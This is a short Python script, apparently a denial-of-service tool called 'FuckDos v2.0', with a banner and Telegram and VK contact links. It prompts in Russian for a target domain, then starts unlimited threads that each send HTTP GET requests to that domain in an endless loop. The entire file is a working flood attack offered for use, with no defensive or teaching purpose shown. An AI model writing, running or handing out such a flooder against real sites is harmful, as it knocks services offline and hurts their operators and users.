# coding: utf8
import threading
import requests
import os
print("""


╭━━━╮     ╭╮ ╭━━━╮
┃╭━━╯     ┃┃ ╰╮╭╮┃
┃╰━━┳╮╭┳━━┫┃╭╮┃┃┃┣━━┳━━╮
┃╭━━┫┃┃┃╭━┫╰╯╯┃┃┃┃╭╮┃━━┫
┃┃  ┃╰╯┃╰━┫╭╮┳╯╰╯┃╰╯┣━━┃v2.0
╰╯  ╰━━┻━━┻╯╰┻━━━┻━━┻━━╯
t.me/soketpy | vk.com/mb_vlad
""")
ddos = input("Введите домен: ")
input("Нажмите на Enter чтобы начать!")

def dos():
 while True:
  requests.get("%s" % str(ddos))
  
while True:
 threading.Thread(target=dos).start()
